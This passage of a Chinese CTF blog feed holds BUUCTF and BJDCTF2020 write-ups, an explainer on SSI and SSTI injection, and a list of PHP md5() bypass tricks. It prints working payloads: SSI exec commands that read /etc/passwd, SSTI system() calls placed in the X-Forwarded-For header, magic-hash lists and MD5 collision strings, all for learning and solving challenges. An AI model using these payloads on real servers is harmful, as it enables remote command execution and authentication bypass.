src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/10.png" class title="Da4er"><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/11.png" class title="Da4er"><hr><h3 id="黑客帝国"><a href="#黑客帝国" class="headerlink" title="黑客帝国"></a>黑客帝国</h3><p>题目是个txt文件，打开发现rar文件头，在winhex里直接hex转ascii查看。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/12.png" class title="Da4er"><p>保存为压缩包，有秘密爆破一下。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/13.png" class title="Da4er"><p>解压后发现一个损坏的png图片，查看一下16进制发现是jpg的图片，直接将png的文件头改成jpg文件头，便可得到flag。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/14.png" class title="Da4er"><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/15.png" class title="Da4er"><hr><h3 id="真的很杂"><a href="#真的很杂" class="headerlink" title="真的很杂"></a>真的很杂</h3><p>foremost出来一个压缩包，打开压缩包发现是apk文件，直接改后缀名，然后用jadx工具反编译一下，便可得到flag。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/16.png" class title="Da4er"><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/17.png" class title="Da4er"><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/18.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;john-in-the-middle&quot;&gt;&lt;a href=&quot;#john-in-the-middle&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.12 浅谈SSI和SSTI漏洞</title>
    <link href="https://da4er.top/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E.html"/>
    <id>https://da4er.top/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E.html</id>
    <published>2020-02-12T09:35:03.000Z</published>
    <updated>2020-02-12T09:38:52.428Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="一-SSI漏洞解析"><a href="#一-SSI漏洞解析" class="headerlink" title="一.SSI漏洞解析"></a>一.SSI漏洞解析</h3><h4 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h4><p>现在大多数Web服务很少用到SSI，但是还是有有必要了解一下。<br><strong>SSI全称是Server Side Includes，即服务器端包含，是一种基于服务器端的网页制作技术。</strong></p><p><strong>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</strong></p><p><strong>基本原理就是：SSI在HTML文件中，可以通过注释行调用命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</strong></p><p>SSI漏洞存在于shtml，stm，shtm文件中，就是应用ssi技术的html文件，当我在这个页面加入ssi指令后，服务器开始解析，将文件图片包含或者远程执行命令。</p><hr><h4 id="2-开启ssi"><a href="#2-开启ssi" class="headerlink" title="2.开启ssi"></a>2.开启ssi</h4><h5 id="1-Nginx"><a href="#1-Nginx" class="headerlink" title="(1)Nginx"></a>(1)Nginx</h5><p>在配置文件中添加如下几项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssi on;</span><br><span class="line">ssi_silent_errors off;</span><br><span class="line">ssi_types text&#x2F;shtml;</span><br></pre></td></tr></table></figure><h5 id="2-Apache"><a href="#2-Apache" class="headerlink" title="(2)Apache"></a>(2)Apache</h5><p>修改Apache配置文件httpd.conf：</p><ul><li><p>确认加载include.so模块，将注释去掉：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule include_module libexec&#x2F;apache2&#x2F;mod_include.so</span><br></pre></td></tr></table></figure></li><li><p>AddType部分去掉这两段注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">AddType text&#x2F;html .shtml</span><br><span class="line">AddOutputFilter INCLUDES .shtml</span><br></pre></td></tr></table></figure></li><li><p>Directory目录权限里面找到Options Indexes FollowSymLinks，并增加Includes修改为Options Indexes FollowSymLinks Includes；</p></li><li><p>重新启动Apache；</p></li></ul><hr><h4 id="3-SSI基本语法："><a href="#3-SSI基本语法：" class="headerlink" title="3.SSI基本语法："></a>3.SSI基本语法：</h4><p>其语法格式必须是以html的注释符 <strong>&lt;!–</strong> 开头、且后面紧接#符号和SSI命令，它们期间不能存在空格：</p><ul><li><p>显示服务器端环境变量 <strong>&lt;#echo&gt;</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本文档名称：&lt;!--#echo var&#x3D;&quot;DOCUMENT_NAME&quot;--&gt;</span><br><span class="line">现在时间：&lt;!--#echo var&#x3D;&quot;DATE_LOCAL&quot;--&gt;</span><br><span class="line">显示IP地址：&lt;!--#echo var&#x3D;&quot;REMOTE_ADDR&quot;--&gt;</span><br></pre></td></tr></table></figure></li><li><p>将文本内容直接插入到文档中&lt;#include&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file&#x3D;&quot;文件名称&quot;--&gt;</span><br><span class="line">&lt;!--#include virtual&#x3D;&quot;index.html&quot; --&gt;</span><br><span class="line">&lt;!--#include virtual&#x3D;&quot;文件名称&quot;–&gt;</span><br><span class="line">&lt;!--#include virtual&#x3D;&quot;&#x2F;www&#x2F;footer.html&quot; --&gt;</span><br></pre></td></tr></table></figure></li></ul><p><strong>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径。</strong></p><ul><li>直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;命令&quot;--&gt;</span><br><span class="line">&lt;!--#exec cmd&#x3D;&quot;cat &#x2F;etc&#x2F;passwd&quot;--&gt;</span><br><span class="line">&lt;!--#exec cgi&#x3D;&quot;文件名称&quot;--&gt;</span><br><span class="line">&lt;!--#exec cgi&#x3D;&quot;&#x2F;cgi-bin&#x2F;access_log.cgi&quot;--&gt;</span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="4-SSI注入漏洞"><a href="#4-SSI注入漏洞" class="headerlink" title="4.SSI注入漏洞"></a>4.SSI注入漏洞</h4><h5 id="1-如何利用"><a href="#1-如何利用" class="headerlink" title="(1)如何利用"></a>(1)如何利用</h5><p><strong>简单点说就是攻击者可以通过外部输入SSI标签到Web页面（stm、shtm、shtml文件）来动态执行代码。<br>SSI注入允许远程在Web应用中注入脚本来执行代码。<br>简单点说就是攻击者可以通过外部输入SSI语句到Web页面来动态执行代码。</strong></p><p><strong>一般地，在stm、shtm、shtml等文件中，存在XSS的页面，大概率是存在SSI注入漏洞的。<br>也就是说，用户输入的内容会显示在页面中的场景。<br>比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI注入漏洞。</strong></p><hr><h5 id="2-前提条件"><a href="#2-前提条件" class="headerlink" title="(2)前提条件"></a>(2)前提条件</h5><p>攻击者要想进行SSI注入、在Web服务器上运行任意命令，需要满足下列几点前提条件才能成功：<strong>Web服务器支持并开启了SSI；<br>Web应用程序在返回HTML页面时，嵌入了用户输入的内容；<br>外部输入的参数值未进行有效的过滤；</strong></p><hr><p><a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">参考博客</a><br>例题：BUUCTF [BJDCTF2020]EasySearch，BWAPP靶场的SSI注入漏洞。</p><hr><h3 id="二-SSTI漏洞"><a href="#二-SSTI漏洞" class="headerlink" title="二.SSTI漏洞"></a>二.SSTI漏洞</h3><h4 id="1-原理-1"><a href="#1-原理-1" class="headerlink" title="(1)原理"></a>(1)原理</h4><p>服务端模板注入是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><hr><h4 id="2-利用"><a href="#2-利用" class="headerlink" title="(2)利用"></a>(2)利用</h4><p> 检测方法如下：</p><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/1.png" class title="Da4er"><p> 当我们输入的内容，经过web模板解析后返回到html页面中，如果在web模板解析时没有进行很好的过滤就会出现SSTI模板注入漏洞。</p><p>以BUU上[护网杯 2018]easy_tornado为例，当我们的filname和filehash不一样的时候会跳转到error页面。</p><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/2.png" class title="Da4er"><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/3.png" class title="Da4er"><p> 当我们输入2不会返回正常的1 * 2而是ORZ</p><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/4.png" class title="Da4er"><p> 证明存在SSTI漏洞<br> 使用python web模板tornado中的handler.settings可以把cookie输出</p><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/5.png" class title="Da4er"><p> 这就可以证明有SSTI模板漏洞，这个漏洞在很多语言的web模板中都存在，不光只有python，因为python tornado模板使用简单，所以造成的危害更大些。</p><p> 也可以使用system函数执行系统命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#39;命令&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>例题：[BJDCTF2020]The mystery of ip<br>题目X-Forwarded-For可控，存在模板注入，可以使用system执行系统命令。<br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For &#123;&#123;system(&#39;cat &#x2F;flag&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/6.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;一-SSI漏洞解析&quot;&gt;&lt;a href=&quot;#一-SSI漏洞解析&quot; class=&quot;headerlink&quot; title=&quot;一.SSI漏洞解析&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.12 [BJDCTF2020]EasySearch&amp;The mystery of ip</title>
    <link href="https://da4er.top/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip.html"/>
    <id>https://da4er.top/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip.html</id>
    <published>2020-02-12T08:18:45.000Z</published>
    <updated>2020-02-12T08:20:32.913Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h3><p>打开题目先随便输入，发现会弹框。在扫描一下目录，发现.swp备份文件。</p><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/1.png" class title="Da4er"><p>打开index.php.swp页面：</p><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/2.png" class title="Da4er"><p>阅读这段源码：<strong>首先是随机获取文件名的一个函数，最关键的是让password前6个字符的md5加密值等于6d0bc1，然后会在public目录下创建一个shtml文件，再将post传参的username字段写入这个shtml文件中。</strong><br>首先写个脚本让password前6个字符的md5值等于6d0bc1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">a&#x3D; &quot;0123456789&quot;</span><br><span class="line">for o in a:</span><br><span class="line">    for p in a:</span><br><span class="line">        for q in a:</span><br><span class="line">            for r in a:</span><br><span class="line">                for s in a:</span><br><span class="line">                    for t in a:</span><br><span class="line">                        for u in a:</span><br><span class="line">                            b &#x3D; str(o)+str(p)+str(q)+str(r)+str(s)+str(t)+str(u)</span><br><span class="line">                            md5 &#x3D; hashlib.md5(b.encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line">                            if ((md5[0:6])&#x3D;&#x3D;&#39;6d0bc1&#39;):</span><br><span class="line">                                print b</span><br></pre></td></tr></table></figure><p>可以爆破出很多，我拿<strong>2020666来进行传参。</strong></p><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/3.png" class title="Da4er"><p>成功利用，然后就是访问这个新建的shtml文件了，<strong>抓包发现在响应包中有这个文件的路径</strong>：</p><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/4.png" class title="Da4er"><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/5.png" class title="Da4er"><p>到这利用了SSI注入漏洞，所以我们可以在username变量中传入ssi语句来远程执行系统命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;命令&quot;--&gt;</span><br></pre></td></tr></table></figure><p>首先ls一下当前目录：</p><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/6.png" class title="Da4er"><p>发现成功利用，没有进行任何过滤。<br>然后我们在ls一下上一级目录：</p><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/7.png" class title="Da4er"><p>发现了 <strong>‘flag_990c66bf85a09c664f0b6741840499b2’</strong> 文件，最后我们把这个文件cat出来，遍得到flag。</p><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/8.png" class title="Da4er"><hr><h3 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h3><p>这道题我在做的时候试了好多方法，虽然扫描目录的时候发现了.ds_store文件但是没有权限。这个思路行不通，最后还是看了别的师傅的博客，原来是X-Forwarded-For参数可控，使用的是ssti模板注入2333….<br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:&#123;&#123;system(&#39;cat .&#x2F;flag&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/9.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;EasySearch&quot;&gt;&lt;a href=&quot;#EasySearch&quot; class=&quot;headerlink&quot; title=&quot;EasySearch
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP中的md5()函数绕过总结</title>
    <link href="https://da4er.top/PHP%E4%B8%AD%E7%9A%84md5-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93.html"/>
    <id>https://da4er.top/PHP%E4%B8%AD%E7%9A%84md5-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93.html</id>
    <published>2020-02-11T11:52:15.000Z</published>
    <updated>2020-02-11T11:52:53.312Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h3><p>本篇文章记录一下在做ctf题时遇到到的md5()绕过方法。主要分为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">md5(key,true)；</span><br><span class="line">md5()&#x3D;&#x3D;md5()；</span><br><span class="line">md5()&#x3D;&#x3D;&#x3D;md5()；</span><br><span class="line">(string)key1!&#x3D;&#x3D;(string)key2&amp;&amp;md5(key1)&#x3D;&#x3D;&#x3D;md5(key2)</span><br></pre></td></tr></table></figure><p>绕过思路。</p><hr><h3 id="二-具体方法"><a href="#二-具体方法" class="headerlink" title="二.具体方法"></a>二.具体方法</h3><h4 id="1-MD5-key-true"><a href="#1-MD5-key-true" class="headerlink" title="1. MD5(key,true)"></a>1. MD5(key,true)</h4><p>默认md5第二个参数是false。<br>FALSE - 默认 32 字符十六进制数<br>TRUE -  原始 16 字符二进制格式<br>所以当我们传入一些特殊字符后会在浏览器中显示一些关键字，从而实现绕过。<br>两个特殊的字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">129581926211651571912466741651878684928</span><br><span class="line">ffifdyop：T0Do#&#39;or&#39;8</span><br><span class="line">129581926211651571912466741651878684928：&#39;or&#39;6]!r,b。</span><br></pre></td></tr></table></figure><p>一般传入ffifdyop即可绕过。</p><h4 id="2-md5-md5"><a href="#2-md5-md5" class="headerlink" title="2.md5()==md5()"></a>2.md5()==md5()</h4><p>这个主要用到弱类型比较，以科学计数法0e开头的，在比较时会自动转换成0从而绕过比较。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><p>以上就是一些常用的绕过参数，随便找两个传进去就可以绕过。</p><h4 id="3-md5-md5"><a href="#3-md5-md5" class="headerlink" title="3.md5()===md5()"></a>3.md5()===md5()</h4><p>===强制类型比较，当比较时会比较类型和大小，所以用第二种绕过不了。<br>但是我们可以用数组绕过，当我们传入不符合规定的参数时：md5([1])==md5([2])==error，即error==error从而绕过。</p><h4 id="4-string-key1-string-key2-amp-amp-md5-key1-md5-key2"><a href="#4-string-key1-string-key2-amp-amp-md5-key1-md5-key2" class="headerlink" title="4.(string)key1!==(string)key2&amp;&amp;md5(key1)===md5(key2)"></a>4.(string)key1!==(string)key2&amp;&amp;md5(key1)===md5(key2)</h4><p>这个在比较时强制类型转换成string类型，所以第三种就不可以了。<br>但是这个要求我们传入md5相同但是字符串不相同的两个参数，其实这样的情况是存在的。<br>两条payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Param1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">Param2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>上面的payload就可以绕过，当然还有很多这样的字符串。<br>注意一下的是在post传参时要urlencode一下。</p>]]></content>
    
    <summary type="html">
    
      
      
